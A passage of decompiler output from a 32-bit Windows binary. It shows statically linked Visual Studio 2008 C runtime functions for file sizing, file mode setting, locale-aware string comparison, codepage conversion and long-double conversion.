    if (_Dst != (char *)0x0) {
      _Src = _Str;
      sVar5 = _strlen((char *)_Str);
      eVar6 = _strcpy_s(_Dst,sVar5 + 2,(char *)_Src);
      if (eVar6 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      puVar2[(int)_Dst - (int)_Str] = '\0';
      BVar7 = SetEnvironmentVariableA
                        (_Dst,(LPCSTR)(~-(uint)bVar9 & (uint)(puVar2 + ((int)_Dst - (int)_Str) + 1))
                        );
      if (BVar7 == 0) {
        local_10 = -1;
        piVar1 = __errno();
        *piVar1 = 0x2a;
      }
      _free(_Dst);
    }
  }
  if (bVar9) {
    _free(_Str);
    *_POption = (char *)0x0;
    return local_10;
  }
  return local_10;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_0041f18d;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_0041f18d;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_0041f18d;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_0041f28b;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_0041f18d;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_0041f1df;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_0041f1df:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_0041f28b:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_0041f18d;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_0041f18d:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_0046eb40 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_0041f359;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_0041f359:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_PMode = DAT_0042dc48;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_0042bfa4 = CreateFileA("CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_0041f63b;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_0041f63b;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_0041f57b:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_0041f57b;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_0041f63b:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2008 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar2 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else if (_MaxCount < 0x80000000) {
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
      }
      else {
        do {
          iVar2 = __tolower_l((uint)(byte)*_Str1,&local_14);
          _Str1 = _Str1 + 1;
          iVar3 = __tolower_l((uint)(byte)*_Str2,&local_14);
          _Str2 = (char *)((byte *)_Str2 + 1);
          _MaxCount = _MaxCount - 1;
          if ((_MaxCount == 0) || (iVar2 == 0)) break;
        } while (iVar2 == iVar3);
        iVar2 = iVar2 - iVar3;
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else {
      piVar1 = __errno();
      *piVar1 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_0041fd27;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_0042c068 - 1;
    iVar6 = (int)(DAT_0042c068 + ((int)DAT_0042c068 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_0042c068 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_0041f95b;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041f962;
LAB_0041f95b:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041f962:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_0041f970;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_0041f970:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042c064 - DAT_0042c068)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042c064 < iVar14) {
        if (iVar14 < DAT_0042c060) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042c074;
          iVar4 = (int)(DAT_0042c06c + ((int)DAT_0042c06c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042c06c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042c06c + ((int)DAT_0042c06c >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042c06c & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042c074 + DAT_0042c060;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_0041fd27;
      }
      local_14 = DAT_0042c064 - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_0042c068 - 1;
      iVar14 = (int)(DAT_0042c068 + ((int)DAT_0042c068 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_0042c068 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041fb13;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_0041fb13:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042c06c + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_0041fd27:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042c06c & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_0042c070 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_0042c070 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_0042026b;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_0042c080 - 1;
    iVar6 = (int)(DAT_0042c080 + ((int)DAT_0042c080 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_0042c080 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
